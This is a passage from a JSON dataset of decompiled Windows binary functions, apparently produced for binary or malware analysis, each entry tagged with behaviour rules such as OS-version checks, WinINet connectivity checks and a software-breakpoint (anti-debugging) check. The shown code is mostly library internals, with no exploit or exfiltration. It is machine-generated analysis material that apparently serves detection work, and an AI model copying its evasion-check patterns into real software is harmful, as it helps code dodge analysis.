{\n                    pcVar7 = pcStack16 + 1;\n                    pcVar6 = pcStack16;\n                    do {\n                        cVar3 = *pcVar6;\n                        pcVar6 = pcVar6 + 1;\n                    } while (cVar3 != '\\0');\n                    iVar5 = pcVar6 - pcVar7;\n                    if (iVar5 < 0) goto code_r0x004127e7;\n                }\n                if (*(pcStack16 + -8) < iVar5) goto code_r0x004127e7;\n                *(pcStack16 + -0xc) = iVar5;\n                ppcVar4 = &pcStack16;\n                pcStack16[iVar5] = '\\0';\n                fcn.00423eb8();\n                pcVar7 = pcVar2 + 1;\n                iStack4 = -1;\n                piVar1 = iStack20 + -4;\n                LOCK();\n                iVar5 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    (**(**(iStack20 + -0x10) + 4))(iStack20 + -0x10);\n                }\n                unaff_EBP = iVar8;\n                if (pcStack16 <= pcVar7) {\n                    *in_FS_OFFSET = piStack12;\n                    return;\n                }\n            }\n            if (pcVar7 < pcStack16) {\n                fcn.00402f40(pcVar7 + param_1, ppcVar4);\n                uStack8 = 1;\n                fcn.00423eb8();\n                piStack12 = 0xffffffff;\n                piVar1 = iStack4 + -4;\n                LOCK();\n                iVar8 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                if (iVar8 == 1 || iVar8 + -1 < 0) {\n                    (**(**(iStack4 + -0x10) + 4))(iStack4 + -0x10);\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = piStack12;\n    return;\n}\n",
        "token_count": 1096
    },
    "00414dc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414dc0(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t **ppiVar7;\n    int32_t **ppiVar8;\n    int32_t **ppiVar9;\n    int32_t **in_FS_OFFSET;\n    int32_t **ppiVar10;\n    code *pcStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t *piStack52;\n    int32_t *piStack36;\n    char cStack32;\n    int32_t *piStack12;\n    int32_t **ppiStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    ppiStack8 = 0x483bc8;\n    piStack12 = *in_FS_OFFSET;\n    uVar6 = *0x4a9ec8 ^ &stack0xffffffa0;\n    *in_FS_OFFSET = &piStack12;\n    if (0x7fffffd < *(param_1 + 8)) {\n        uStack56 = 0xf;\n        uStack60 = 0;\n        fcn.00403ef0(\"map/set<T> too long\", 0x13, uVar6);\n        piStack12 = NULL;\n        fcn.00411280(&stack0xffffffa8);\n        pcStack64 = vtable.std::length_error.0;\n        fcn.00456b8d(&pcStack64, 0x49e590);\n    }\n    ppiVar9 = ppiStack8;\n    ppiVar10 = ppiStack8;\n    ppiVar7 = fcn.004141c0(*(param_1 + 4), ppiStack8, *(param_1 + 4), uStack4, 0);\n    *(param_1 + 8) = *(param_1 + 8) + 1;\n    if (ppiVar9 == *(param_1 + 4)) {\n        (*(param_1 + 4))[1] = ppiVar7;\n        **(param_1 + 4) = ppiVar7;\n        *(*(param_1 + 4) + 8) = ppiVar7;\n    }\n    else if (cStack32 == '\\0') {\n        ppiVar9[2] = ppiVar7;\n        if (ppiVar9 == *(*(param_1 + 4) + 8)) {\n            *(*(param_1 + 4) + 8) = ppiVar7;\n        }\n    }\n    else {\n        *ppiVar9 = ppiVar7;\n        if (ppiVar9 == **(param_1 + 4)) {\n            **(param_1 + 4) = ppiVar7;\n        }\n    }\n    cVar1 = *(ppiVar7[1] + 0xb);\n    ppiVar9 = ppiVar7;\n    while (cVar1 == '\\0') {\n        ppiVar8 = ppiVar9 + 1;\n        ppiVar2 = *ppiVar8;\n        ppiVar3 = ppiVar2[1];\n        if (ppiVar2 == *ppiVar3) {\n            piVar4 = ppiVar3[2];\n            if (*(piVar4 + 0xb) == '\\0') {\n                *(ppiVar2 + 0xb) = 1;\n                *(piVar4 + 0xb) = 1;\n                *((*ppiVar8)[1] + 0x2c) = 0;\n                ppiVar9 = (*ppiVar8)[1];\n            }\n            else {\n                if (ppiVar9 == ppiVar2[2]) {\n                    ppiVar10 = ppiVar2;\n                    fcn.0040fe60();\n                    ppiVar9 = ppiVar2;\n                }\n                *(ppiVar9[1] + 0xb) = 1;\n                *(ppiVar9[1][1] + 0x2c) = 0;\n                fcn.0040ede0(ppiVar9[1][1], ppiVar10);\n            }\n        }\n        else {\n            piVar4 = *ppiVar3;\n            if (*(piVar4 + 0xb) == '\\0') {\n                *(ppiVar2 + 0xb) = 1;\n                *(piVar4 + 0xb) = 1;\n                *((*ppiVar8)[1] + 0x2c) = 0;\n                ppiVar9 = (*ppiVar8)[1];\n            }\n            else {\n                if (ppiVar9 == *ppiVar2) {\n                    fcn.0040ede0();\n                    ppiVar9 = ppiVar2;\n                }\n                *(ppiVar9[1] + 0xb) = 1;\n                *(ppiVar9[1][1] + 0x2c) = 0;\n                piVar4 = ppiVar9[1][1];\n                piVar5 = piVar4[2];\n                piVar4[2] = *piVar5;\n                if (*(*piVar5 + 0x2d) == '\\0') {\n                    *(*piVar5 + 4) = piVar4;\n                }\n                piVar5[1] = piVar4[1];\n                if (piVar4 == *(*(param_1 + 4) + 4)) {\n                    *(*(param_1 + 4) + 4) = piVar5;\n                }\n                else {\n                    ppiVar2 = piVar4[1];\n                    if (piVar4 == *ppiVar2) {\n                        *ppiVar2 = piVar5;\n                    }\n                    else {\n                        ppiVar2[2] = piVar5;\n                    }\n                }\n                *piVar5 = piVar4;\n                piVar4[1] = piVar5;\n            }\n        }\n        cVar1 = *(ppiVar9[1] + 0xb);\n    }\n    *(*(*(param_1 + 4) + 4) + 0x2c) = 1;\n    piStack36[1] = ppiVar7;\n    *piStack36 = param_1;\n    *in_FS_OFFSET = piStack52;\n    return;\n}\n",
        "token_count": 1402
    },
    "00415030": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00415030(int32_t param_1, uint param_2, int32_t *param_3)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *unaff_EBX;\n    uint *puVar5;\n    bool bVar6;\n    uint *unaff_retaddr;\n    uint uStack12;\n    int32_t iStack8;\n    uint *puStack4;\n    \n    puVar4 = (*(param_1 + 4))[1];\n    cVar1 = *(puVar4 + 0x2d);\n    bVar6 = true;\n    uStack12 = CONCAT31(uStack12._1_3_, 1);\n    puVar5 = *(param_1 + 4);\n    while (cVar1 == '\\0') {\n        puVar5 = puVar4;\n        if (puVar4[3] == 0) goto code_r0x004150d1;\n        iVar3 = fcn.00456b7a(*param_3, puVar4[3]);\n        bVar6 = iVar3 < 0;\n        uStack12 = uStack12 & 0xffffff00 | bVar6;\n        if (bVar6) {\n            puVar4 = *puVar4;\n        }\n        else {\n            puVar4 = puVar4[2];\n        }\n        cVar1 = *(puVar4 + 0x2d);\n    }\n    iStack8 = param_1;\n    puStack4 = puVar5;\n    if (bVar6) {\n        if (puVar5 == **(param_1 + 4)) {\n            puVar4 = fcn.00414dc0(&iStack8, 1, puVar5, param_3);\n            uVar2 = *puVar4;\n            uStack12[1] = puVar4[1];\n            *(uStack12 + 2) = 1;\n            *uStack12 = uVar2;\n            return;\n        }\n        fcn.0040efb0();\n    }\n    iVar3 = *param_3;\n    puVar4 = puStack4;\n    if (iVar3 == 0) {\ncode_r0x004150d1:\n        iVar3 = fcn.00401070(0x80004005);\n    }\n    iVar3 = fcn.00456b7a(puVar4[3], iVar3);\n    if (-1 < iVar3) {\n        unaff_retaddr[1] = puVar4;\n        *(unaff_retaddr + 2) = 0;\n        *unaff_retaddr = uStack12;\n        return;\n    }\n    puVar4 = fcn.00414dc0(&uStack12, unaff_EBX, puVar5, param_3);\n    uVar2 = *puVar4;\n    unaff_EBX[1] = puVar4[1];\n    *(unaff_EBX + 2) = 1;\n    *unaff_EBX = uVar2;\n    return;\n}\n",
        "token_count": 676
    },
    "00415330": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00415330(uint *param_1, uint *param_2, uint *param_3, int32_t param_4, uint *param_5)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint *var_ch;\n    uint *puStack48;\n    int32_t iStack44;\n    uint *puStack40;\n    uint *puStack36;\n    uint *puStack32;\n    uint *puStack12;\n    uint *puStack4;\n    \n    if (param_1[2] == 0) {\n        puStack32 = 0x1;\n        puStack36 = param_2;\n        puStack40 = 0x415354;\n        fcn.00414dc0();\n        return param_2;\n    }\n    iVar1 = *param_1[1];\n    if ((var_ch == NULL) || (var_ch != param_1)) {\n        fcn.0045780d();\n    }\n    if (param_4 == iVar1) {\n        puStack32 = param_4 + 0xc;\n        puStack36 = param_5;\n        puStack40 = 0x41538e;\n        cVar2 = fcn.00410860();\n        if (cVar2 != '\\0') {\n            puStack40 = param_5;\n            iStack44 = param_4;\n            puStack48 = 0x1;\n            fcn.00414dc0(puStack4);\n            return puStack4;\n        }\n    }\n    else {\n        iVar1 = param_1[1];\n        if ((var_ch == NULL) || (var_ch != param_1)) {\n            puStack32 = 0x4153c2;\n            fcn.0045780d();\n        }\n        if (param_4 == iVar1) {\n            puStack36 = *(param_1[1] + 8) + 0xc;\n            puStack32 = param_5;\n            puStack40 = 0x4153dc;\n            cVar2 = fcn.00410860();\n            if (cVar2 != '\\0') {\n                iStack44 = *(param_1[1] + 8);\n                puStack40 = param_5;\n                puStack48 = NULL;\n                fcn.00414dc0(puStack4);\n                return puStack4;\n            }\n        }\n        else {\n            puStack32 = param_4 + 0xc;\n            puStack36 = param_5;\n            puStack40 = 0x415412;\n            cVar2 = fcn.00410860();\n            if (cVar2 != '\\0') {\n                puStack40 = 0x415427;\n                fcn.0040efb0();\n                iStack44 = param_4 + 0xc;\n                puStack40 = param_5;\n                puStack48 = 0x415437;\n                cVar2 = fcn.00410860();\n                if (cVar2 != '\\0') {\n                    puStack48 = param_5;\n                    if (*(puStack4[2] + 0x2d) != '\\0') {\n                        fcn.00414dc0(puStack12, 0, puStack4);\n                        return puStack12;\n                    }\n                    fcn.00414dc0(puStack12, 1, param_4);\n                    return puStack12;\n                }\n            }\n            puStack48 = param_5;\n            cVar2 = fcn.00410860(param_4 + 0xc);\n            if (cVar2 != '\\0') {\n                puStack32 = param_1[1];\n                puStack36 = param_1;\n                fcn.0040ef10();\n                cVar2 = fcn.0040ebf0(&stack0xffffffdc);\n                if (cVar2 == '\\0') {\n                    cVar2 = fcn.00410860(param_5, var_ch + 3);\n                    if (cVar2 == '\\0') goto code_r0x00415505;\n                }\n                puVar3 = puStack32;\n                if (*(*(param_4 + 8) + 0x2d) != '\\0') {\n                    fcn.00414dc0(puStack32, 0, param_4, param_5);\n                    return puVar3;\n                }\n                fcn.00414dc0(puStack32, 1, var_ch, param_5);\n                return puVar3;\n            }\n        }\n    }\ncode_r0x00415505:\n    puVar3 = fcn.00415030(&stack0xffffffd0, param_5);\n    *puStack40 = *puVar3;\n    puStack40[1] = puVar3[1];\n    return puStack40;\n}\n",
        "token_count": 1052
    },
    "004160e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004160e0(int32_t **param_1)\n\n{\n    int32_t **arg_8h;\n    int32_t *piVar1;\n    \n    piVar1 = *param_1;\n    while (piVar1 != NULL) {\n        arg_8h = *param_1;\n        *param_1 = *arg_8h;\n        fcn.0045839d(arg_8h);\n        piVar1 = *param_1;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00416210": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00416210(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *arg_8h;\n    \n    if (param_1 == NULL) {\n        fcn.00401070(0x80070057);\n    }\n    arg_8h = param_1;\n    if (param_1 < 0) {\n        fcn.00401070(0x80070057);\n        arg_8h = extraout_ECX;\n    }\n    if (param_2 == 0) {\n        fcn.00401070(0x80070057);\n        arg_8h = extraout_ECX_00;\n    }\n    iVar1 = *param_1;\n    if (iVar1 == param_2) goto code_r0x00416288;\n    if (param_2 < arg_8h) {\n        iVar1 = fcn.0045880f(iVar1, arg_8h, 1);\n        if (iVar1 != 0) goto code_r0x00416299;\n        iVar1 = fcn.00401070(0x8007000e);\n    }\n    fcn.0045839d(iVar1);\n    do {\n        *param_1 = param_2;\n        while( true ) {\n            if (*param_1 != 0) {\n                return;\n            }\n            fcn.00401070(0x8007000e);\n            arg_8h = extraout_ECX_01;\ncode_r0x00416288:\n            if (arg_8h <= param_2) break;\n            iVar1 = fcn.004585b5(arg_8h, 1);\ncode_r0x00416299:\n            *param_1 = iVar1;\n        }\n    } while( true );\n}\n",
        "token_count": 434
    },
    "0045839d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0045839d(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00459460(0x4a4788, 0xc);\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 != 0) {\n        if (*0x4af180 == 3) {\n            fcn.00466299(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.004663b5(iVar1);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.004663e0(arg_8h_00, iVar1);\n            }\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004583f3();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x00458425;\n            iVar1 = *(unaff_EBP + 8);\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4adafc, 0, iVar1);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0045924d();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00459212(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\ncode_r0x00458425:\n    fcn.004594a5();\n    return;\n}\n",
        "token_count": 426
    },
    "00417274": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00417274(uint32_t arg_8h, uint32_t wParam, int32_t lParam, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint32_t var_ch;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h == 0x2b) {\n        var_4h = lParam;\n        var_8h = 0x4172f9;\n        (**(*in_ECX + 0x138))();\n        return 1;\n    }\n    if (arg_8h == 0x2c) {\n        var_4h = lParam;\n        var_8h = 0x4172ec;\n        (**(*in_ECX + 0x13c))();\n        return 1;\n    }\n    if (arg_8h == 0x2d) {\n        var_4h = lParam;\n        var_8h = 0x4172df;\n        (**(*in_ECX + 0x144))();\n        return 1;\n    }\n    if (arg_8h == 0x2e) {\n        var_4h = wParam >> 0x10;\n        var_8h = wParam & 0xffff;\n        var_ch = 0x4172d2;\n        iVar1 = (**(*in_ECX + 0x148))();\n    }\n    else if (arg_8h == 0x2f) {\n        var_4h = wParam >> 0x10;\n        var_8h = wParam & 0xffff;\n        var_ch = 0x4172bc;\n        iVar1 = (**(*in_ECX + 0x14c))();\n    }\n    else {\n        if (arg_8h != 0x39) {\n            if (in_ECX[0x14] != 0) {\n                var_8h = lParam;\n                var_ch = wParam;\n                iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[8], arg_8h + 0x2000);\n                if ((6 < arg_8h - 0x132) || (iVar1 != 0)) {\n                    if (arg_14h != NULL) {\n                        *arg_14h = iVar1;\n                    }\n                    iVar1 = 1;\n                }\n                return iVar1;\n            }\n            if (arg_8h < 0x112) {\n                if (arg_8h == 0x111) {\n                    iVar1 = fcn.00421dec(0, wParam >> 0x10 | 0xbd110000, 0, 0);\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                    if (arg_14h != NULL) {\n                        *arg_14h = 1;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (0x2a < arg_8h) {\n                    if ((arg_8h < 0x30) || (arg_8h == 0x39)) goto code_r0x0042120f;\n                    if (arg_8h == 0x4e) {\n                        var_8h = arg_14h;\n                        var_4h = lParam;\n                        iVar1 = fcn.00421dec(0, *(lParam + 8) & 0xffff | 0xbc4e0000, &fcn.00417274::var_8h, 0);\n                        return iVar1;\n                    }\n                }\n            }\n            else if ((0x113 < arg_8h) && ((arg_8h < 0x116 || (arg_8h == 0x210)))) {\ncode_r0x0042120f:\n                iVar1 = fcn.00420ad0(arg_8h + 0xbc00, wParam, lParam, arg_14h);\n                return iVar1;\n            }\n            if (arg_8h - 0x132 < 7) {\n                var_4h = arg_8h - 0x132;\n                var_8h = wParam;\n                iVar1 = fcn.00420ad0(0xbc19, 0, &fcn.00417274::var_ch, arg_14h);\n                if (*arg_14h != 0) {\n                    return iVar1;\n                }\n            }\n            return 0;\n        }\n        var_4h = lParam;\n        var_8h = 0x4172a1;\n        iVar1 = (**(*in_ECX + 0x140))();\n    }\n    *arg_14h = iVar1;\n    return 1;\n}\n",
        "token_count": 1048
    },
    "004176d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.004176d0(int16_t *arg_8h, uint arg_ch, int16_t *arg_10h)\n\n{\n    if (arg_10h == NULL) {\n        arg_10h = fcn.0041901a();\n    }\n    if ((arg_8h == NULL) && (arg_ch != 0)) {\n        *(arg_10h + 2) = 0;\n        *(arg_10h + 6) = 0xffffffff;\n        *(arg_10h + 8) = 0xffffffff;\n        *arg_10h = arg_ch;\n        *(arg_10h + 4) = 1;\n        arg_8h = arg_10h;\n    }\n    return arg_8h;\n}\n",
        "token_count": 172
    },
    "004177de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004177de(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.ole32.dll_CoTreatAsClass;\n    iVar2 = (*_sym.imp.ole32.dll_CoTreatAsClass)(arg_ch, arg_10h);\n    if ((iVar2 != 0) && (arg_8h != 0)) {\n        (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000000, \"CLSID\", &var_8h);\n        var_4h = 0;\n        (*_sym.imp.ole32.dll_StringFromCLSID)(arg_ch, &var_4h);\n        uVar3 = fcn.004308a4(var_4h);\n        uVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueA)(var_8h, uVar3, 1, arg_8h, uVar4);\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(uVar3);\n        iVar2 = (*pcVar1)(arg_ch, arg_10h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_8h);\n    }\n    return iVar2;\n}\n",
        "token_count": 338
    },
    "0041786e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041786e(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    piVar1 = arg_8h;\n    if (arg_8h != NULL) {\n        iVar2 = (**(*arg_8h + 0x58))(arg_8h, &var_8h);\n        if ((iVar2 != 0) || (var_8h != 1)) {\n            (**(*piVar1 + 4))(piVar1);\n            return piVar1;\n        }\n        arg_8h = NULL;\n        iVar2 = (**(*piVar1 + 0x30))(piVar1, 1, &arg_8h);\n        if (iVar2 == 0) {\n            var_4h = NULL;\n            (**(*arg_8h + 0xc))(arg_8h, 1, &var_4h, 0);\n            fcn.00430b55(&arg_8h);\n            return var_4h;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 263
    },
    "004178d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004178d5(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    if (arg_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        var_8h = fcn.0041786e(arg_8h);\n        if (var_8h != NULL) {\n            iVar1 = (**(*var_8h + 0x58))(var_8h, &var_ch);\n            if ((iVar1 == 0) && (var_ch == 2)) {\n                var_4h = 0;\n                iVar1 = (*_sym.imp.ole32.dll_CreateBindCtx)(0, &var_4h);\n                if (iVar1 == 0) {\n                    arg_8h = 0;\n                    iVar1 = (**(*var_8h + 0x50))(var_8h, var_4h, 0, &arg_8h);\n                    if ((iVar1 == 0) && (arg_8h != 0)) {\n                        uVar2 = fcn.00458ff6(arg_8h);\n                        (*_sym.imp.ole32.dll_CoTaskMemFree)(arg_8h);\n                    }\n                    fcn.00430b55(&var_4h);\n                }\n            }\n            fcn.00430b55(&var_8h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 352
    },
    "00417d45": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00417d45(int32_t arg_8h, int32_t noname_1, int32_t noname_2, int32_t noname_3, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h, int32_t arg_2ch, int16_t *arg_30h, int16_t *arg_34h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint unaff_ESI;\n    uint var_24h;\n    uint var_20h;\n    uint hMem;\n    int16_t *var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    var_18h = arg_34h;\n    if (arg_30h == NULL) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_30h);\n        iVar2 = iVar2 + 1;\n    }\n    if ((arg_34h == NULL) || (*arg_34h == 0)) {\n        var_18h = arg_30h;\n        iVar3 = iVar2;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_34h);\n        iVar3 = iVar3 + 1;\n    }\n    iVar1 = (iVar3 + iVar2) * 2 + 0x34;\n    iVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x2042, iVar1);\n    if (iVar4 != 0) {\n        piVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar4);\n        if (arg_30h == NULL) {\n            piVar5[0xb] = 0;\n        }\n        else {\n            piVar5[0xb] = 0x34;\n            fcn.00416060(piVar5 + 0xd, iVar2, arg_30h);\n        }\n        if (var_18h == NULL) {\n            piVar5[0xc] = 0;\n        }\n        else {\n            iVar2 = iVar2 * 2 + 0x34;\n            piVar5[0xc] = iVar2;\n            fcn.00416060(iVar2 + piVar5, iVar3, var_18h);\n        }\n        *piVar5 = iVar1;\n        piVar5[5] = arg_18h;\n        piVar5[1] = arg_8h;\n        piVar5[6] = arg_1ch;\n        piVar5[2] = noname_1;\n        piVar5[7] = arg_20h;\n        piVar5[8] = arg_24h;\n        piVar5[3] = noname_2;\n        piVar5[9] = arg_28h;\n        piVar5[4] = noname_3;\n        piVar5[10] = arg_2ch;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar4);\n    }\n    fcn.004566a8(unaff_ESI);\n    return;\n}\n",
        "token_count": 736
    },
    "00418201": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00418201(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (param_2 < *(iVar1 + -0xc)) {\n        param_2 = *(iVar1 + -0xc);\n    }\n    if (*(iVar1 + -4) < 2) {\n        iVar1 = *(iVar1 + -8);\n        if (iVar1 < param_2) {\n            if (iVar1 < 0x401) {\n                iVar1 = iVar1 * 2;\n            }\n            else {\n                iVar1 = iVar1 + 0x400;\n            }\n            if (iVar1 < param_2) {\n                iVar1 = param_2;\n            }\n            fcn.004181cd(iVar1);\n        }\n    }\n    else {\n        fcn.00418165(param_2);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "00418eff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418eff(int32_t *param_1)\n\n{\n    if (0 < param_1[1]) {\n        (**(*param_1 + 4))(1);\n    }\n    return;\n}\n",
        "token_count": 49
    },
    "0041a206": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
